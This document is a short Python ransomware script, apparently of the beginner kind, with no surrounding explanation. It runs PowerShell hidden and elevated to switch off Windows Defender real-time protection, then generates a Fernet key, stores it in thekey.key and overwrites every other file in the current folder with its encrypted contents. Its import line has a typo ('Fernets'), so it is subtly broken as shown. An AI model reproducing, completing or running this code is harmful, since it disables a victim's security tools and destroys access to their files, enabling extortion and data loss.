import os
import base64
import ctypes
from cryptography.fernet import Fernets

#disable WD
ctypes.windll.shell32.ShellExecuteW(None, "runas", "powershell", "Set-MpPreference -DisableRealtimeMonitoring $true", None, 0)

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypter.py" or file == "horse.py":
            continue
    if os.path.isfile(file):
          files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
      thekey.write(key)

for file in files:
        with open(file,"rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file,"wb") as thefile:
              thefile.write(contents_encrypted)